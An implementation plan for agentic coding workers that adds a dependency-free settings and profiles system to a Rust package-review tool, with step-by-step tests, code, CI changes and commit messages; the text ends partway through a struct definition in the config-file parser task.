# Settings and Profiles Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add a layered, dependency-free settings system (built-in profiles, a root-owned system file, a tighten-only user file) that decides per source class whether the AI review is required, what findings do, and which OpenCode model and thinking level are used.

**Architecture:** A new `config` module (`model`, `file`, `resolve`, `load`, `show`) turns two TOML files plus a built-in profile into a `Policy` and `AgentSettings` per `SourceClass`. The report stops computing a fixed verdict and instead produces a `Decision` from its findings and a policy lookup. The review pipeline, CLI, pacman hook and a new `setup` wizard all consume `Settings`.

**Tech Stack:** Rust 2024 (MSRV 1.88), std only, in-crate `tomlish` reader, OpenCode CLI (`--model`, `--variant`), pacman / pacman-conf, bash e2e harness with bwrap.

**Spec:** `docs/superpowers/specs/2026-09-28-settings-and-profiles-design.md`

## Global Constraints

- Zero crates: `[dependencies]`, `[dev-dependencies]`, `[build-dependencies]` stay empty; `Cargo.lock` lists only `omarchy-guardian`.
- No new runtime tools: only tools already used plus `pacman-conf`; no `gum`, no TUI library; prompts are plain reads/writes on `/dev/tty`.
- User-writable input (user config, environment, CLI flags of user-level commands) may only make privileged classes (`official`, `third-party-repo`, `local-package`) stricter.
- `[agent]`, `[agent.variants]`, `official_repos` and class `model` for privileged classes come only from the system file.
- An invalid AI reply (malformed, no nonce, tool use, `inconclusive`) always blocks; only AI *unavailability* follows the `ai` knob.
- Every non-AI gap keeps blocking in every profile.
- Built-in profile values exactly as spec §5; `timeout_secs` defaults 120 (≤ medium), 180 (high), 300 (max); range 10..=900; `max_input_kib` default 256, range 16..=1024.
- System file path `/etc/omarchy-guardian/config.toml`; user file `$XDG_CONFIG_HOME/omarchy-guardian/config.toml` (default `~/.config/omarchy-guardian/config.toml`).
- Before every commit: `cargo fmt --all`, `cargo clippy --all-targets --all-features -- -D warnings`, `cargo test` (on Linux). On macOS use `cargo clippy --target x86_64-unknown-linux-gnu --all-targets -- -D warnings`; tests need Linux.
- Code style: no emojis, no horizontally dense code, blank lines between logical steps, comments only for non-obvious intent; no `Co-Authored-By` in commits.
- Before the first edit call `mcp__hippius-mem__recall` about this task; `mcp__hippius-mem__remember` any durable gotcha found.

## Review Focus

1. A user config that sets a looser value for a privileged class (`[class.official] ai = "off"`) must be ignored with a visible warning, not silently applied or silently dropped — pinned in Task 5 (`user_cannot_loosen_privileged_classes`) and Task 11 (`config show` lists ignored values).
2. A system file that exists but is unreadable, a symlink, or group-writable must block privileged gates rather than fall back to defaults — pinned in Task 6 (`insecure_or_invalid_system_file_blocks_privileged_classes`).
3. An `[agent.variants]` or model that OpenCode rejects must surface as AI unavailable naming the setting, and under `standard` must not block `official` — pinned in Task 7 (`provider_errors_are_unavailable`) and Task 8 (`official_proceeds_when_ai_is_unavailable_under_standard`).
4. A `-Syu` mixing official and third-party packages must block if only the third-party scriptlet is flagged, and only warn if only the official one is — pinned in Task 10 (`mixed_transaction_uses_each_targets_policy`).
5. `local-only` confirmation with no controlling terminal (unattended `omarchy update`) must block, never hang or default to yes — pinned in Task 9 (`confirmation_without_a_terminal_blocks`).

---

## File Structure

| File | Status | Responsibility |
|---|---|---|
| `src/zero_deps.rs` | create (test-only) | enforce the zero-dependency rule from `Cargo.lock` / `Cargo.toml` |
| `src/tomlish.rs` | modify | typed values (`Value`, `typed_value`), `Entry::line`, `ParseError::line` |
| `src/config/mod.rs` | create | module root |
| `src/config/model.rs` | create | `SourceClass`, `Profile`, `AiRequirement`, `Action`, `Thinking`, `Named`, `Policy`, `AgentSettings`, `builtin` |
| `src/config/file.rs` | create | strict parse of one file into `PartialConfig` |
| `src/config/resolve.rs` | create | layer merge with tighten-only rule, origins, ignored values |
| `src/config/load.rs` | create | file locations, ownership check, `Settings` |
| `src/config/show.rs` | create | `config show` / `config check` rendering |
| `src/classify.rs` | create | repo → `SourceClass` from pacman output |
| `src/setup.rs` | create | interactive wizard |
| `src/agent.rs` | modify | `AgentSettings` → `--model`/`--variant`/timeout; `AgentError` |
| `src/report.rs` | modify | `AgentRun`, class tagging, `Decision`, `decide`, headlines |
| `src/review.rs` | modify | `ReviewContext`, input limit from settings, grouped agent runs |
| `src/pacman.rs` | modify | per-target class, repo SigLevel, privileged block |
| `src/cli.rs` | modify | `--class`, `--profile`, confirmation, `config`, `setup` |
| `src/test_support.rs` | modify | failing mock OpenCode |
| `src/main.rs` | modify | new modules |
| `integrations/yay/guardian-makepkg`, `integrations/omarchy/guardian-theme` | modify | pass `--class` |
| `tests/e2e/integration-gates.sh` | modify | settings scenarios |
| `.github/workflows/ci.yml` | modify | dependency check step |
| `README.md`, `packaging/arch/omarchy-guardian.install` | modify | document profiles and setup |

**Dead-code note (Tasks 2–8):** the `config` module and new `tomlish` items are only wired into `main` in Task 9. Until then, mark each new *module declaration* or new *pub item* that is not yet reachable from `main` with
`#[cfg_attr(not(test), expect(dead_code, reason = "wired into the CLI in Task 9"))]`.
Task 9 removes every one of these markers (verified with `grep`).

---

### Task 1: Zero-dependency guard

**Files:**
- Create: `src/zero_deps.rs`
- Modify: `src/main.rs` (module list), `.github/workflows/ci.yml`

**Interfaces:**
- Consumes: `tomlish::entries`, `tomlish::array_table_items`, `tomlish::string_field`, `tomlish::Entry::full_path` (all existing).
- Produces: nothing used by other tasks.

- [ ] **Step 1: Write the test module**

`src/zero_deps.rs`:

```rust
//! Guards the crate's zero-dependency rule (settings spec §2): the lockfile
//! may only contain this crate, and no dependency table may have entries.

use crate::tomlish;

#[test]
fn cargo_lock_contains_only_this_crate() {
    let entries = tomlish::entries(include_str!("../Cargo.lock")).unwrap();

    let names: Vec<Option<String>> = tomlish::array_table_items(&entries, "package")
        .iter()
        .map(|package| tomlish::string_field(package, "name"))
        .collect();

    assert_eq!(names, [Some("omarchy-guardian".to_string())]);
}

#[test]
fn manifest_dependency_tables_are_empty() {
    let entries = tomlish::entries(include_str!("../Cargo.toml")).unwrap();

    let declared: Vec<String> = entries
        .iter()
        .map(tomlish::Entry::full_path)
        .filter(|path| {
            path.iter().any(|segment| {
                matches!(
                    *segment,
                    "dependencies" | "dev-dependencies" | "build-dependencies"
                )
            })
        })
        .map(|path| path.join("."))
        .collect();

    assert!(declared.is_empty(), "dependencies declared: {declared:?}");
}
```

In `src/main.rs`, after `mod tomlish;` add:

```rust
#[cfg(test)]
mod zero_deps;
```

- [ ] **Step 2: Run the tests; they pass on the current tree**

Run: `cargo test zero_deps`
Expected: 2 passed.

- [ ] **Step 3: Prove the guard catches a violation**

Temporarily append to `Cargo.toml`:

```toml
[dev-dependencies]
itoa = "1"
```

Run: `cargo test --offline zero_deps::manifest_dependency_tables_are_empty`
Expected: FAIL with `dependencies declared: ["dev-dependencies.itoa"]` (if cargo refuses to resolve offline, the build error itself proves the table is non-empty; either way revert).

Revert the change: `git checkout Cargo.toml Cargo.lock`.

- [ ] **Step 4: Add the CI step**

In `.github/workflows/ci.yml`, insert before the `Format` step:

```yaml
      - name: No dependencies
        run: |
          count=$(cargo tree --locked -e normal,build,dev --depth 1 --prefix none | grep -c .)
          if [ "$count" -ne 1 ]; then
            cargo tree --locked -e normal,build,dev --depth 1
            echo "omarchy-guardian must not depend on any crate" >&2
            exit 1
          fi
```

- [ ] **Step 5: Verify and commit**

Run: `cargo fmt --all && cargo clippy --all-targets -- -D warnings && cargo test`
Expected: clean, all tests pass.

```bash
git add src/zero_deps.rs src/main.rs .github/workflows/ci.yml
git commit -m "Enforce the zero-dependency rule in tests and CI

The settings work must not pull in crates. A unit test reads Cargo.lock
and Cargo.toml with the in-crate TOML reader, and CI fails when cargo
tree shows anything but this crate."
```

---

### Task 2: Typed TOML values and line numbers

**Files:**
- Modify: `src/tomlish.rs`

**Interfaces:**
- Consumes: existing `decode_basic`, `decode_literal`, `string_value`, `Reader`.
- Produces:
  - `pub enum Value { String(String), Integer(i64), Bool(bool), StringArray(Vec<String>) }`
  - `pub fn typed_value(raw: &str) -> Option<Value>`
  - `Entry` gains `pub line: usize` (1-based line of the key)
  - `impl ParseError { pub fn line(&self) -> usize }`

- [ ] **Step 1: Write failing tests**

Add to `mod tests` in `src/tomlish.rs` (extend its `use super::{...}` with `Value, typed_value`):

```rust
    #[test]
    fn typed_values_cover_the_config_forms() {
        assert_eq!(typed_value(r#""text""#), Some(Value::String("text".into())));
        assert_eq!(typed_value("'lit'"), Some(Value::String("lit".into())));
        assert_eq!(typed_value("true"), Some(Value::Bool(true)));
        assert_eq!(typed_value("false"), Some(Value::Bool(false)));
        assert_eq!(typed_value("120"), Some(Value::Integer(120)));
        assert_eq!(typed_value("-5"), Some(Value::Integer(-5)));
        assert_eq!(typed_value("1_024"), Some(Value::Integer(1024)));
        assert_eq!(
            typed_value("[\n \"core\", 'extra',\n]"),
            Some(Value::StringArray(vec!["core".into(), "extra".into()]))
        );
        assert_eq!(typed_value("[]"), Some(Value::StringArray(Vec::new())));
    }

    #[test]
    fn typed_values_reject_everything_else() {
        for raw in ["01", "1__0", "_1", "1_", "1.5", "0x10", "yes", "[1, 2]", "[\"a\" \"b\"]", "{ a = 1 }"] {
            assert_eq!(typed_value(raw), None, "accepted {raw:?}");
        }
    }

    #[test]
    fn entries_and_errors_carry_line_numbers() {
        let parsed = entries("# c\n\na = 1\n[t]\nb = [\n 1,\n]\nc = 2\n").unwrap();
        let lines: Vec<usize> = parsed.iter().map(|entry| entry.line).collect();
        assert_eq!(lines, [3, 5, 8]);

        let error = entries("a = 1\nb = \"open\n").unwrap_err();
        assert_eq!(error.line(), 2);
    }
```

- [ ] **Step 2: Run to verify failure**

Run: `cargo test tomlish`
Expected: compile errors: `Value`, `typed_value`, `line` not found.

- [ ] **Step 3: Implement**

In `src/tomlish.rs`:

1. Add `pub line: usize,` as the last field of `Entry` with doc comment `/// 1-based line of the key.`
2. Add to `impl ParseError`:

```rust
impl ParseError {
    pub fn line(&self) -> usize {
        self.line
    }
}
```

3. In `entries`, in the `Some(_) =>` arm, capture the line before reading the key and store it:

```rust
            Some(_) => {
                let line = reader.line();
                let key = reader.key_path()?;
                reader.expect(b'=', "expected '=' after key")?;
                let value = reader.value()?;
                reader.end_of_line()?;
                entries.push(Entry {
                    section,
                    table: table.clone(),
                    array_table,
                    key,
                    value,
                    line,
                });
            }
```

4. In `impl Reader<'_>`, replace `fn error` with:

```rust
    /// 1-based line of the current position.
    fn line(&self) -> usize {
        // Splitting on newlines yields one piece per line up to the position.
        self.bytes[..self.position.min(self.bytes.len())]
            .split(|byte| *byte == b'\n')
            .count()
    }

    fn error(&self, message: &'static str) -> ParseError {
        ParseError {
            line: self.line(),
            message,
        }
    }
```

5. Add after `is_empty_container`:

```rust
/// A typed value in Guardian's own config file. Only the forms the config
/// uses are supported; anything else is `None` and becomes a config error.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Value {
    String(String),
    Integer(i64),
    Bool(bool),
    StringArray(Vec<String>),
}

pub fn typed_value(raw: &str) -> Option<Value> {
    if let Some(text) = string_value(raw) {
        return Some(Value::String(text));
    }
    match raw {
        "true" => return Some(Value::Bool(true)),
        "false" => return Some(Value::Bool(false)),
        _ => {}
    }
    if raw.starts_with('[') {
        return string_array(raw).map(Value::StringArray);
    }
    integer(raw).map(Value::Integer)
}

/// Decimal integers with optional sign and single underscores between digits.
fn integer(raw: &str) -> Option<i64> {
    let (negative, digits) = match raw.strip_prefix('-') {
        Some(rest) => (true, rest),
        None => (false, raw.strip_prefix('+').unwrap_or(raw)),
    };

    let well_formed = !digits.is_empty()
        && !digits.starts_with('_')
        && !digits.ends_with('_')
        && !digits.contains("__")
        && digits.bytes().all(|byte| byte.is_ascii_digit() || byte == b'_')
        && !(digits.len() > 1 && digits.starts_with('0'));
    if !well_formed {
        return None;
    }

    let value: i64 = digits.replace('_', "").parse().ok()?;
    if negative { value.checked_neg() } else { Some(value) }
}

/// An array whose elements are all strings. Comments were already removed
/// by `Reader::value`.
fn string_array(raw: &str) -> Option<Vec<String>> {
    let inner = raw.strip_prefix('[')?.strip_suffix(']')?.as_bytes();
    let skip_whitespace = |index: &mut usize| {
        while inner.get(*index).is_some_and(u8::is_ascii_whitespace) {
            *index += 1;
        }
    };

    let mut items = Vec::new();
    let mut index = 0;
    loop {
        skip_whitespace(&mut index);
        let (text, used) = match inner.get(index) {
            None => return Some(items),
            Some(b'"') => decode_basic(&inner[index + 1..])?,
            Some(b'\'') => decode_literal(&inner[index + 1..])?,
            Some(_) => return None,
        };
        items.push(text);
        index += used + 1;

        skip_whitespace(&mut index);
        match inner.get(index) {
            None => return Some(items),
            Some(b',') => index += 1,
            Some(_) => return None,
        }
    }
}
```

Mark `Value` and `typed_value` with the Task 2–8 dead-code marker (see File Structure note).

- [ ] **Step 4: Run tests**

Run: `cargo test tomlish`
Expected: all tomlish tests pass (including the existing ones).

- [ ] **Step 5: Verify and commit**

Run: `cargo fmt --all && cargo clippy --all-targets -- -D warnings && cargo test`

```bash
git add src/tomlish.rs
git commit -m "Add typed values and line numbers to the TOML reader

Guardian's own config needs strings, integers, booleans and string
arrays, and config errors must name the offending line."
```

---

### Task 3: Settings vocabulary and built-in profiles

**Files:**
- Create: `src/config/mod.rs`, `src/config/model.rs`
- Modify: `src/main.rs`

**Interfaces:**
- Consumes: nothing.
- Produces (all in `crate::config::model`):
  - `pub trait Named: Copy + 'static { const ALL: &'static [Self]; fn name(self) -> &'static str; fn parse(text: &str) -> Option<Self>; }` (default `parse`)
  - `#[derive(Default)] pub enum SourceClass { Official, ThirdPartyRepo, LocalPackage, Aur, Theme, Plugin, #[default] Source }` with `pub const fn is_privileged(self) -> bool`
  - `pub enum Profile { Standard, Strict, LocalOnly }` with `pub const fn summary(self) -> &'static str`
  - `pub enum AiRequirement { Off, Optional, Required }`, `pub enum Action { Warn, Block }`, `pub enum Thinking { Default, Minimal, Low, Medium, High, Max }` — each derives `PartialOrd, Ord` in loosest-first order
  - `pub struct Policy { pub ai, pub on_findings: Action, pub on_ai_suspicious: Action, pub thinking, pub model: Option<String>, pub timeout_secs: Option<u32>, pub confirm: bool }` with `pub fn timeout_secs(&self) -> u32`
  - `pub struct AgentSettings { pub model: Option<String>, pub thinking: Thinking, pub variant: Option<String>, pub timeout_secs: u32, pub max_input_bytes: usize }` with `Default` and `pub fn label(&self) -> String`
  - `pub fn builtin(profile: Profile, class: SourceClass) -> Policy`
  - `pub const DEFAULT_MAX_INPUT_KIB: u32 = 256;`

- [ ] **Step 1: Write failing tests**

Create `src/config/model.rs` containing only the test module first:

```rust
#[cfg(test)]
mod tests {
    use super::{
        Action, AgentSettings, AiRequirement, Named, Policy, Profile, SourceClass, Thinking,
        builtin,
    };

    fn knobs(policy: &Policy) -> (AiRequirement, Action, Action, Thinking, bool) {
        (
            policy.ai,
            policy.on_findings,
            policy.on_ai_suspicious,
            policy.thinking,
            policy.confirm,
        )
    }

    #[test]
    fn builtin_profiles_match_the_spec() {
        use Action::{Block, Warn};
        use AiRequirement::{Off, Optional, Required};
        use Thinking::{Default, High, Low, Max, Medium};

        for class in SourceClass::ALL.iter().copied() {
            let official = class == SourceClass::Official;
            let user_level = !class.is_privileged();

            let standard = knobs(&builtin(Profile::Standard, class));
            let strict = knobs(&builtin(Profile::Strict, class));
            let local = knobs(&builtin(Profile::LocalOnly, class));

            if official {
                assert_eq!(standard, (Optional, Warn, Block, Low, false));
                assert_eq!(strict, (Required, Block, Block, Medium, false));
                assert_eq!(local, (Off, Warn, Block, Default, false));
            } else {
                assert_eq!(standard, (Required, Block, Block, High, false), "{class:?}");
                assert_eq!(strict, (Required, Block, Block, Max, false), "{class:?}");
                assert_eq!(local, (Off, Block, Block, Default, user_level), "{class:?}");
            }
        }
    }

    #[test]
    fn knob_order_is_strictness() {
        assert!(AiRequirement::Off < AiRequirement::Optional);
        assert!(AiRequirement::Optional < AiRequirement::Required);
        assert!(Action::Warn < Action::Block);
        assert!(Thinking::Default < Thinking::Minimal && Thinking::High < Thinking::Max);
    }

    #[test]
    fn names_round_trip() {
        for class in SourceClass::ALL.iter().copied() {
            assert_eq!(SourceClass::parse(class.name()), Some(class));
        }
        assert_eq!(SourceClass::parse("third-party-repo"), Some(SourceClass::ThirdPartyRepo));
        assert_eq!(Profile::parse("local-only"), Some(Profile::LocalOnly));
        assert_eq!(Thinking::parse("max"), Some(Thinking::Max));
        assert_eq!(AiRequirement::parse("optional"), Some(AiRequirement::Optional));
        assert_eq!(Action::parse("warn"), Some(Action::Warn));
        assert_eq!(Profile::parse("Standard"), None);
    }

    #[test]
    fn timeouts_follow_thinking_unless_set() {
        let mut policy = builtin(Profile::Standard, SourceClass::Aur);
        assert_eq!(policy.timeout_secs(), 180);
        policy.thinking = Thinking::Max;
        assert_eq!(policy.timeout_secs(), 300);
        policy.thinking = Thinking::Low;
        assert_eq!(policy.timeout_secs(), 120);
        policy.timeout_secs = Some(45);
        assert_eq!(policy.timeout_secs(), 45);
    }

    #[test]
    fn agent_label_names_model_and_thinking() {
        let mut settings = AgentSettings::default();
        assert_eq!(settings.label(), "default model · default thinking");
        settings.model = Some("anthropic/claude-sonnet-5".into());
        settings.thinking = Thinking::High;
        assert_eq!(settings.label(), "anthropic/claude-sonnet-5 · high");
    }
}
```

Create `src/config/mod.rs`:

```rust
//! Settings: built-in profiles, the system and user config files, and how
//! they combine into a per-source-class policy.

pub mod model;
```

In `src/main.rs` add (alphabetical position, with the dead-code marker):

```rust
#[cfg_attr(not(test), expect(dead_code, reason = "wired into the CLI in Task 9"))]
mod config;
```

- [ ] **Step 2: Run to verify failure**

Run: `cargo test config::model`
Expected: compile errors for the missing types.

- [ ] **Step 3: Implement**

Prepend to `src/config/model.rs`:

```rust
//! The settings vocabulary (spec §3–§5): source classes, profiles, the
//! per-class knobs and the built-in profile tables.
//!
//! Knob enums declare their variants loosest first, so the derived `Ord` is
//! the strictness order the tighten-only rule relies on.

pub const DEFAULT_MAX_INPUT_KIB: u32 = 256;

/// An enum spelled in the config file by a fixed lowercase name.
pub trait Named: Copy + 'static {
    const ALL: &'static [Self];

    fn name(self) -> &'static str;

    fn parse(text: &str) -> Option<Self> {
        Self::ALL.iter().copied().find(|value| value.name() == text)
    }
}

#[derive(Clone, Copy, Debug, Default, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum SourceClass {
    Official,
    ThirdPartyRepo,
    LocalPackage,
    Aur,
    Theme,
    Plugin,
    #[default]
    Source,
}

impl SourceClass {
    /// Enforced by the root pacman hook; user settings may only tighten these.
    pub const fn is_privileged(self) -> bool {
        match self {
            Self::Official | Self::ThirdPartyRepo | Self::LocalPackage => true,
            Self::Aur | Self::Theme | Self::Plugin | Self::Source => false,
        }
    }
}

impl Named for SourceClass {
    const ALL: &'static [Self] = &[
        Self::Official,
        Self::ThirdPartyRepo,
        Self::LocalPackage,
        Self::Aur,
        Self::Theme,
        Self::Plugin,
        Self::Source,
    ];

    fn name(self) -> &'static str {
        match self {
            Self::Official => "official",
            Self::ThirdPartyRepo => "third-party-repo",
            Self::LocalPackage => "local-package",
            Self::Aur => "aur",
            Self::Theme => "theme",
            Self::Plugin => "plugin",
            Self::Source => "source",
        }
    }
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Profile {
    Standard,
    Strict,
    LocalOnly,
}

impl Profile {
    /// One line for the setup wizard and `config show`.
    pub const fn summary(self) -> &'static str {
        match self {
            Self::Standard => {
                "AI review for community sources; official updates never blocked by an unavailable AI"
            }
            Self::Strict => "AI review required everywhere; any finding blocks",
            Self::LocalOnly => "no AI: source never leaves this machine; you confirm community installs",
        }
    }
}

impl Named for Profile {
    const ALL: &'static [Self] = &[Self::Standard, Self::Strict, Self::LocalOnly];

    fn name(self) -> &'static str {
        match self {
            Self::Standard => "standard",
            Self::Strict => "strict",
            Self::LocalOnly => "local-only",
        }
    }
}

#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord)]
pub enum AiRequirement {
    Off,
    Optional,
    Required,
}

impl Named for AiRequirement {
    const ALL: &'static [Self] = &[Self::Off, Self::Optional, Self::Required];

    fn name(self) -> &'static str {
        match self {
            Self::Off => "off",
            Self::Optional => "optional",
            Self::Required => "required",
        }
    }
}

#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord)]
pub enum Action {
    Warn,
    Block,
}

impl Named for Action {
    const ALL: &'static [Self] = &[Self::Warn, Self::Block];

    fn name(self) -> &'static str {
        match self {
            Self::Warn => "warn",
            Self::Block => "block",
        }
    }
}

#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord)]
pub enum Thinking {
    Default,
    Minimal,
    Low,
    Medium,
    High,
    Max,
}

impl Named for Thinking {
    const ALL: &'static [Self] = &[
        Self::Default,
        Self::Minimal,
        Self::Low,
        Self::Medium,
        Self::High,
        Self::Max,
    ];

    fn name(self) -> &'static str {
        match self {
            Self::Default => "default",
            Self::Minimal => "minimal",
            Self::Low => "low",
            Self::Medium => "medium",
            Self::High => "high",
            Self::Max => "max",
        }
    }
}

/// Everything that decides how one source class is reviewed and judged.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Policy {
    pub ai: AiRequirement,
    /// Local-rule and OSV findings.
    pub on_findings: Action,
    /// An AI `suspicious` verdict or any AI finding.
    pub on_ai_suspicious: Action,
    pub thinking: Thinking,
    pub model: Option<String>,
    /// `None` derives the timeout from `thinking`.
    pub timeout_secs: Option<u32>,
    /// With `ai = off`: ask the user before running anything.
    pub confirm: bool,
}

impl Policy {
    pub fn timeout_secs(&self) -> u32 {
        self.timeout_secs.unwrap_or(match self.thinking {
            Thinking::High => 180,
            Thinking::Max => 300,
            Thinking::Default | Thinking::Minimal | Thinking::Low | Thinking::Medium => 120,
        })
    }
}

/// How one OpenCode review is run.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct AgentSettings {
    pub model: Option<String>,
    pub thinking: Thinking,
    /// The `--variant` value, or `None` for the provider default.
    pub variant: Option<String>,
    pub timeout_secs: u32,
    pub max_input_bytes: usize,
}

impl Default for AgentSettings {
    fn default() -> Self {
        Self {
            model: None,
            thinking: Thinking::Default,
            variant: None,
            timeout_secs: 120,
            max_input_bytes: DEFAULT_MAX_INPUT_KIB as usize * 1024,
        }
    }
}

impl AgentSettings {
    /// `model · thinking`, shown next to every AI verdict.
    pub fn label(&self) -> String {
        let model = self.model.as_deref().unwrap_or("default model");
        let thinking = match self.thinking {
            Thinking::Default => "default thinking",
            other => other.name(),
        };
        format!("{model} · {thinking}")
    }
}

/// The built-in value of every knob for one profile and class (spec §5).
pub fn builtin(profile: Profile, class: SourceClass) -> Policy {
    use Action::{Block, Warn};
    use AiRequirement::{Off, Optional, Required};

    let official = class == SourceClass::Official;
    let (ai, on_findings, thinking) = match (profile, official) {
        (Profile::Standard, true) => (Optional, Warn, Thinking::Low),
        (Profile::Standard, false) => (Required, Block, Thinking::High),
        (Profile::Strict, true) => (Required, Block, Thinking::Medium),
        (Profile::Strict, false) => (Required, Block, Thinking::Max),
        (Profile::LocalOnly, true) => (Off, Warn, Thinking::Default),
        (Profile::LocalOnly, false) => (Off, Block, Thinking::Default),
    };

    Policy {
        ai,
        on_findings,
        on_ai_suspicious: Block,
        thinking,
        model: None,
        timeout_secs: None,
        // The pacman hook has no reliable terminal, so only user-level
        // classes can ask.
        confirm: profile == Profile::LocalOnly && !class.is_privileged(),
    }
}
```

- [ ] **Step 4: Run tests**

Run: `cargo test config::model`
Expected: 5 passed.

- [ ] **Step 5: Verify and commit**

Run: `cargo fmt --all && cargo clippy --all-targets -- -D warnings && cargo test`

```bash
git add src/config src/main.rs
git commit -m "Add the settings vocabulary and built-in profiles

Source classes, profiles and the per-class knobs, with knob variants
ordered loosest first so strictness is the derived Ord. The standard,
strict and local-only tables follow the settings spec."
```

---

### Task 4: Config file parser

**Files:**
- Create: `src/config/file.rs`
- Modify: `src/config/mod.rs` (`pub mod file;`)

**Interfaces:**
- Consumes: `tomlish::{entries, typed_value, Value, Entry}`, `ParseError::line`; `model::{Named, SourceClass, Profile, AiRequirement, Action, Thinking}`.
- Produces:
  - `pub struct ConfigError { pub file: PathBuf, pub line: usize, pub key: String, pub message: String }` (`Display`)
  - `pub struct PartialPolicy { pub ai: Option<AiRequirement>, pub on_findings: Option<Action>, pub on_ai_suspicious: Option<Action>, pub thinking: Option<Thinking>, pub model: Option<String>, pub timeout_secs: Option<u32>, pub confirm: Option<bool> }` (`Default`, `Clone`, `PartialEq`, `Debug`)
  - `pub struct AgentDefaults { pub model: Option<String>, pub max_input_kib: Option<u32>, pub variants: Vec<(Thinking, String)> }`
  - `pub struct PartialConfig { pub profile: Option<Profile>, pub official_repos: Option<Vec<String>>, pub agent: AgentDefaults, pub classes: Vec<(SourceClass, PartialPolicy)> }` with `pub fn class(&self, class: SourceClass) -> PartialPolicy`
  - `pub fn parse(file: &Path, text: &str) -> Result<PartialConfig, ConfigError>`
  - `pub const TIMEOUT_RANGE: RangeInclusive<u32> = 10..=900; pub const INPUT_KIB_RANGE: RangeInclusive<u32> = 16..=1024;`

- [ ] **Step 1: Write failing tests**

`src/config/file.rs` test module:

```rust
#[cfg(test)]
mod tests {
    use std::path::Path;

    use super::{PartialPolicy, parse};
    use crate::config::model::{Action, AiRequirement, Profile, SourceClass, Thinking};

    const EXAMPLE: &str = r#"
profile = "strict"
official_repos = ["core", "extra"]

[agent]
model = "anthropic/claude-sonnet-5"
max_input_kib = 512

[agent.variants]
max = "xhigh"

[class.official]
model = "anthropic/claude-haiku-4-5"
thinking = "low"

[class.aur]
ai = "required"
on_findings = "block"
on_ai_suspicious = "warn"
thinking = "max"
timeout_secs = 300
confirm = true
"#;

    fn parse_str(text: &str) -> Result<super::PartialConfig, super::ConfigError> {
        parse(Path::new("/test/config.toml"), text)
    }

    #[test]
    fn parses_every_supported_key() {
        let config = parse_str(EXAMPLE).unwrap();

        assert_eq!(config.profile, Some(Profile::Strict));
        assert_eq!(config.official_repos, Some(vec!["core".into(), "extra".into()]));
        assert_eq!(config.agent.model.as_deref(), Some("anthropic/claude-sonnet-5"));
        assert_eq!(config.agent.max_input_kib, Some(512));
        assert_eq!(config.agent.variants, [(Thinking::Max, "xhigh".to_string())]);
        assert_eq!(
            config.class(SourceClass::Official),
            PartialPolicy {
                model: Some("anthropic/claude-haiku-4-5".into()),
                thinking: Some(Thinking::Low),
                ..PartialPolicy::default()
            }
        );
        assert_eq!(
            config.class(SourceClass::Aur),
            PartialPolicy {
                ai: Some(AiRequirement::Required),
                on_findings: Some(Action::Block),
                on_ai_suspicious: Some(Action::Warn),
                thinking: Some(Thinking::Max),
                model: None,
                timeout_secs: Some(300),
                confirm: Some(true),
            }
        );
        assert_eq!(config.class(SourceClass::Theme), PartialPolicy::default());
    }

    #[test]
    fn errors_name_the_line_and_key() {
        let cases = [
            ("profile = \"paranoid\"\n", 1, "profile"),
            ("\n[class.aur]\non_finding = \"block\"\n", 3, "class.aur.on_finding"),
            ("[class.nope]\nai = \"off\"\n", 2, "class.nope.ai"),
            ("[agent]\nmax_input_kib = 4096\n", 2, "agent.max_input_kib"),
            ("[class.aur]\ntimeout_secs = 5\n", 2, "class.aur.timeout_secs"),
            ("[agent]\nmodel = \"no-slash\"\n", 2, "agent.model"),
            ("[agent.variants]\ndefault = \"x\"\n", 2, "agent.variants.default"),
            ("[class.official]\nconfirm = true\n", 2, "class.official.confirm"),
            ("official_repos = [\"core\", \"bad repo\"]\n", 1, "official_repos"),
            ("profile = 1\n", 1, "profile"),
            ("[[class]]\nai = \"off\"\n", 2, "class.ai"),
            ("[class.aur]\nai = \"off\"\n[class.aur]\nai = \"required\"\n", 4, "class.aur.ai"),
            ("mystery = true\n", 1, "mystery"),
        ];

        for (text, line, key) in cases {
            let error = parse_str(text).unwrap_err();
            assert_eq!((error.line, error.key.as_str()), (line, key), "{text:?}: {error}");
        }
    }

    #[test]
    fn syntax_errors_carry_the_line() {
        let error = parse_str("profile = \"standard\"\n[agent\n").unwrap_err();
        assert_eq!(error.line, 2);
        assert!(error.to_string().starts_with("/test/config.toml:2: "));
    }

    #[test]
    fn an_empty_file_is_valid() {
        assert_eq!(parse_str("# nothing\n").unwrap(), super::PartialConfig::default());
    }
}
```

Add `pub mod file;` to `src/config/mod.rs`.

- [ ] **Step 2: Run to verify failure**

Run: `cargo test config::file`
Expected: compile errors.

- [ ] **Step 3: Implement**

Prepend to `src/config/file.rs`:

```rust
//! Strict parsing of one config file (spec §6). Unknown keys, wrong types
//! and out-of-range values are errors naming the file, line and key, so a
//! typo never silently does nothing.

use std::fmt;
use std::ops::RangeInclusive;
use std::path::{Path, PathBuf};

use crate::config::model::{Action, AiRequirement, Named, Profile, SourceClass, Thinking};
use crate::tomlish::{self, Entry, Value};

pub const TIMEOUT_RANGE: RangeInclusive<u32> = 10..=900;
pub const INPUT_KIB_RANGE: RangeInclusive<u32> = 16..=1024;

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct ConfigError {
    pub file: PathBuf,
    pub line: usize,
    /// Dotted key path; empty for syntax errors.
    pub key: String,
    pub message: String,
}

impl fmt::Display for ConfigError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f, "{}:{}: ", self.file.display(), self.line)?;
        if !self.key.is_empty() {
            write!(f, "{}: ", self.key)?;
        }
        f.write_str(&self.message)
    }
}

impl std::error::Error for ConfigError {}

#[derive(Clone, Debug, Default, PartialEq, Eq)]
pub struct PartialPolicy {
    pub ai: Option<AiRequirement>,
    pub on_findings: Option<Action>,
    pub on_ai_suspicious: Option<Action>,
    pub thinking: Option<Thinking>,
    pub model: Option<String>,
    pub timeout_secs: Option<u32>,
    pub confirm: Option<bool>,
